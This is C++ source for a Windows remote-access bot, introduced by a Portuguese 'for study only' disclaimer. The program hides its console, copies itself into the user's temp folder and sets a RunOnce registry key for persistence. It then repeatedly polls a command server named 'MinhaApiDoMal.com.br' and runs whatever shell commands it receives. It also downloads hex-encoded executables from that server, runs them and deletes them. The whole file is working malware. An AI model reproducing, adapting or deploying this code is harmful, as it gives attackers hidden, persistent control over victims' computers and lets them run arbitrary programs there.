/*

Este programa foi criado com a finalidade de estudo somente.
Seu mau uso não é de minha responsabilidade.

*/
#include <winsock2.h>
#include <Lmcons.h>
#include <iostream>
#include <dirent.h>
#include <fstream>
#include <sstream>
#include <iostream>
#include <fstream>
#include <ios>
using namespace std;
#pragma comment(lib,"libws2_32.a")
void MalwareRun();
string HttpGet(string url,string urlAction)
{
  unsigned int nret;
  WSADATA wsaData;
  SOCKET Socket;
  SOCKADDR_IN SockAddr;
  int lineCount=0;
  int rowCount=0;
  struct hostent *host;
  locale local;
  char buffer[2048];
  int nDataLength;
  string website_HTML;
  string get_http;

  if(urlAction == " " || urlAction == "")
  {
    get_http = "GET HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }
  else
  {
    get_http = "GET "+ urlAction +" HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }

      if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
      {
          return "error";
      }

      Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
      host = gethostbyname(url.c_str());

      SockAddr.sin_port=htons(80);
      SockAddr.sin_family=AF_INET;
      SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

      if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0)
      {
          return "error";
      }

      send(Socket,get_http.c_str(), strlen(get_http.c_str()),0 );

      while(true)
      {
          nret = recv(Socket, buffer, sizeof(buffer), 0);
          if(nret == 0 || nret == -1)
          {
            break;
          }
          website_HTML.append(buffer, nret);
      }

      closesocket(Socket);
      WSACleanup();
      return website_HTML;
}
string DeserializeJson(string parameter,string htmlResponse)
{
  int initParameter;
  string parameterDeserialize;

  int htmlResponseLenght = htmlResponse.length();
  char char_arrayHtmlResponse[htmlResponseLenght + 1];
  strcpy(char_arrayHtmlResponse, htmlResponse.c_str());

  int parameterLenght = parameter.length();
  char char_arrayParameter[parameterLenght + 1];
  strcpy(char_arrayParameter, parameter.c_str());

    for (int i = 0; i < htmlResponseLenght; i++)
    {
      if(char_arrayHtmlResponse[i] == char_arrayParameter[0]
        && char_arrayHtmlResponse[i+1] == char_arrayParameter[1]
        && char_arrayHtmlResponse[i-1] == '"')
     {
       initParameter = i+parameterLenght+3;
       if(char_arrayHtmlResponse[initParameter] == ' ')
       {
         initParameter = i+parameterLenght+4;
       }
       while(char_arrayHtmlResponse[initParameter] != '"')
       {
         parameterDeserialize += char_arrayHtmlResponse[initParameter];
         initParameter++;
       }
       break;
     }
   }
 return parameterDeserialize;
}
void HexToFile(string fileName,string hex)
{
  ofstream datafile(fileName.c_str(), ios_base::binary);

  char buf[3];
  buf[2] = 0;

  stringstream input(hex);
  input.flags(ios_base::hex);
  while (input)
  {
      input >> buf[0] >> buf[1];
      long val = strtol(buf, nullptr, 16);
      datafile << static_cast<unsigned char>(val & 0xff);
  }
}
void ExecByHex(string url,string urlAction)
{
  string htmlResponse = HttpGet(url,urlAction);
  string hex = DeserializeJson("hex",htmlResponse);
  string fileName = DeserializeJson("filename",htmlResponse);
  string parameter = DeserializeJson("parameter",htmlResponse);
  if(parameter == "null")
  {
    parameter = "";
  }
  HexToFile(fileName,hex);
  string command = "start "+fileName+" "+parameter;
  system(command.c_str());
  remove(fileName.c_str());
}
void Malware()
{
  string url = "MinhaApiDoMal.com.br";
  string urlActionScript =  "/bot/gethex.php";
  
  string urlTokenAction = "/bot/generatetoken.php";
  string apiToken = DeserializeJson("token",HttpGet(url,urlTokenAction));
  string urlActionCommand = "/bot/getcommand.php?token="+apiToken;

  while(true)
  {
    try
    {
      string htmlResponse = HttpGet(url,urlActionCommand);
      string command = DeserializeJson("commands",htmlResponse);
      char commandCharArray[command.length() + 1];
      strcpy(commandCharArray, command.c_str());

      int time = stoi(DeserializeJson("time",htmlResponse));
      if(command != urlActionCommand && command != "null" && commandCharArray[0] != '#')
      {
        system(command.c_str());
        Sleep(time);
      }
      if(command != "error" && command != "null" && commandCharArray[0] == '#')
      {
        ExecByHex(url,urlActionScript);
        Sleep(time);
      }
      else
      {
        continue;
      }
    }
    catch (exception ex)
    {
      continue;
    }
  }
}
string current_working_directory()
{
  char* cwd = _getcwd( 0, 0 ) ;
  string working_directory(cwd) ;
  free(cwd) ;
  return working_directory ;
}
void InitConfig(string currentProgramName)
{
  HWND window;
  AllocConsole();
  window = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(window,0);
  char username[UNLEN+1];
  DWORD username_len = UNLEN+1;
  GetUserName(username, &username_len);
  string finalProgramName = "mainFinal.exe";
  string pathUsers = "C:\\Users\\";
  string pathTarget = "\\appdata\\local\\temp\\";
  string input = current_working_directory()+"\\"+currentProgramName;
  string output = pathUsers+username+pathTarget;
  CopyFile(input.c_str(),(output+finalProgramName).c_str(), TRUE);
  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name mainsubprocess -Value "+output+finalProgramName+" -force";
  system(commandPowerShell.c_str());
}
int main(int argc,char *argv[])
{
    InitConfig(argv[0]);
    Malware();
    return 1;
}

